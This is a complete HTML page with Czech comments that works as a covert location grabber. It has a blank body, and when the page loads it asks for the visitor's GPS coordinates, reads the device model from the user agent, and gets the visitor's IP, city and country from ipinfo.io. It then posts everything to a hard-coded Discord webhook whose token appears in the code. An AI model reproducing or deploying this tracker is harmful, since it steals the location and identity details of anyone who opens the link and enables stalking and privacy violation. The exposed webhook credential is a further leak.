<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraƒè sv√Ωm webhookem

        function getLocation() {
            let device = getDeviceModel(); // Detekce za≈ô√≠zen√≠

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    getIP(device, `üìç GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "üö´ GPS zam√≠tnuta");
                });
            } else {
                getIP(device, "üö´ GPS nen√≠ podporov√°na");
            }
        }

        function getDeviceModel() {
            const userAgent = navigator.userAgent;
            let model = "Za≈ô√≠zen√≠: " + userAgent; // Pokud nelze detekovat model, pou≈æije se userAgent

            // P≈ô√≠klady pro r≈Øzn√© platformy (Android, iPhone)
            const androidMatch = userAgent.match(/Android\s[^\;]+;\s([^\)]+)\)/);
            if (androidMatch) {
                model = `Android za≈ô√≠zen√≠: ${androidMatch[1]}`;
            }

            const iosMatch = userAgent.match(/iPhone\sOS\s([^\;]+)\s/i);
            if (iosMatch) {
                model = `iPhone: ${iosMatch[1]}`;
            }

            return model;
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `üì± Za≈ô√≠zen√≠: ${device}\n${gpsData}\nüåç IP Adresa: ${data.ip} (Mƒõsto: ${data.city}, Zemƒõ: ${data.country})`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba z√≠sk√°n√≠ IP:", error));
        }

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes√≠l√°n√≠:", error));
        }

        window.onload = getLocation;
    </script>
</head>
<body>
</body>
</html>
